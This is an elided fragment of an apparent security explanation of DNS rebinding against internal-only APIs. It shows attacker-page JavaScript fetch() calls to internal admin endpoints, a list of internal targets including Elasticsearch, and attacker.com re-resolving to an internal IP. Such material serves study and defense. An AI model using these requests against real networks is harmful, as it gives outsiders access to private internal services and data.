...
An internal-only API (e.g., `http://REDACTED_INTERNAL_IP:8080/admin`) is configured with:
```http
...
2. Attacker page JavaScript fetches internal API:
   fetch('http://REDACTED_INTERNAL_IP:8080/admin/users')
...
const internalAPIs = [
    'http://REDACTED_INTERNAL_IP/admin/config',
    'http://REDACTED_INTERNAL_IP:8080/api/users',
    'http://REDACTED_INTERNAL_IP:9200/_cat/indices',  // Elasticsearch
...
3. Second DNS resolution: attacker.com → REDACTED_INTERNAL_IP (internal IP)
